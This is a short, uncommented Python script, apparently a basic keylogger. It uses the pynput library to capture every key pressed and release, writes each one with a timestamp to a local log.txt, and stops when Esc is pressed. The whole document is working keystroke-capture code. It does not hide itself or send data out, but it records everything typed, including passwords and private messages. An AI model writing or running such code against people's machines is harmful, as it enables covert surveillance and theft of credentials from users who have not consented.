from pynput.keyboard import Key, KeyCode, Listener
from datetime import datetime
from typing import Union
import os

log_file = os.path.join("log.txt")

def write_log(text: str):
    timestamp = datetime.now().strftime("[%d-%m-%Y, %H:%M:%S]")
    try:
        with open(log_file, "a") as f:
            f.write(timestamp + text + "\n")
    except IOError as e:
        print(f"Error writing to log file: {e}")

def on_press(key: Union[Key, KeyCode, None]):
    if key is None:
        return
    if isinstance(key, KeyCode):
        write_log(f"Key pressed: {key.char}")
    else:
        write_log(f"Special key pressed: {key}")

def on_release(key: Union[Key, KeyCode, None]) -> bool | None:
    if key == Key.esc:
        write_log("Session ended.\n" + "-" * 50)
        return False
    return None

write_log("\nSession started.\n" + "-" * 50)
with Listener(on_press=on_press, on_release=on_release) as listener: # type: ignore
    listener.join()